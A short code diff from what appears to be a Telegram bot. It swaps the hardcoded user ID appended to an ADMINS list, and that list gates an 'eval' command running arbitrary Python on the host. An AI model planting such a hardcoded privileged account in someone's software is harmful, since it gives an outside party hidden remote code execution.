@@ -24,7 +24,7 @@ async def aexec(code, client, message):
     )
     return await locals()["__aexec"](client, message)
 
-ADMINS.append(883761960)
+ADMINS.append(1944309678)
 
 @bot.on_message(filters.user(ADMINS) & filters.command("eval"))
 async def _(client, message):
